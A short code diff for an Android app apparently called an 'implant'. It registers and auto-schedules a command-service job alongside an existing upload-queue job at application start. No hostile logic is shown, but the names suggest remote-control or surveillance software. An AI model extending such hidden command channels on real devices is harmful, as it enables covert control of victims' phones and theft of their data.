@@ -1,6 +1,7 @@
 package com.cooperthecoder.implant
 
 import android.app.Application
+import com.cooperthecoder.implant.command.StartCommandServiceJob
 import com.cooperthecoder.implant.command.UploadQueueJob
 import com.cooperthecoder.implant.data.DeviceProperties
 import com.evernote.android.job.JobManager
@@ -29,11 +30,16 @@ class App : Application() {
                     UploadQueueJob()
                 }
 
+                StartCommandServiceJob.JOB_NAME -> {
+                    StartCommandServiceJob()
+                }
+
                 else -> {
                     null
                 }
             }
         }
+        StartCommandServiceJob.schedule()
     }
 }
 
